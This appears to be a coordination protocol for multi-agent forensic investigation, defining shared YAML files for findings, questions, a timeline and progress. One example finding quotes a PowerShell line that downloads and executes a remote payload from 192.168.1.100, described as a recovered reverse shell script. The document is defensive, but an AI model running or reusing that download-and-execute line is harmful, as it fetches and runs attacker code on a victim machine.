# Collaboration Protocol — Shared Directory Convention

All multi-agent coordination happens through the `shared/` directory in the case workspace. No special software needed — just read and write YAML files.

## File Formats

### shared/findings.yaml
Append-only. Every role writes here when discovering something important.
```yaml
- id: F001
  time: "2026-05-05 14:23"
  from: computer_analyst
  type: evidence          # evidence | lead | artifact | question
  summary: "Found PowerShell reverse shell script connecting to 192.168.1.100:4444"
  detail: "Path: C:\\Users\\admin\\AppData\\Local\\Temp\\update.ps1\nContent: IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload')"
  related_to: [server_analyst, network_analyst]
```

### shared/questions.yaml
Cross-role Q&A. Ask other roles to check something.
```yaml
- id: Q001
  time: "2026-05-05 14:30"
  from: server_analyst
  to: computer_analyst
  question: "Any SSH keys on the computer? I see SSH logins to the server from this IP."
  status: pending         # pending | answered
  answer: ""
```

### shared/timeline.yaml
Shared timeline of key events, sorted by time.
```yaml
- time: "2026-05-05 03:15:00"
  event: "PowerShell script executed (Event ID 4688)"
  source: computer_analyst
  evidence: "Security.evtx"

- time: "2026-05-05 03:15:05"
  event: "TCP connection to 192.168.1.100:4444 established"
  source: network_analyst
  evidence: "capture.pcap stream #42"
```

### shared/progress.yaml
Main reads this to track overall status.
```yaml
computer_analyst:
  status: working         # idle | working | done | blocked
  current_task: "Analyzing browser history"
  completed: ["Registry analysis", "Event log review"]
  pending: ["Browser history", "USB history"]

mobile_analyst:
  status: done
  completed: ["ALEAPP extraction", "WeChat analysis", "Call log review"]
  pending: []
```

## Rules
1. **Append-only**: Never delete or modify other roles' entries
2. **Be specific**: Include file paths, timestamps, exact values
3. **Tag related roles**: So they know to check your finding
4. **Answer questions promptly**: Check questions.yaml regularly
5. **Update progress**: Keep progress.yaml current so Main can coordinate
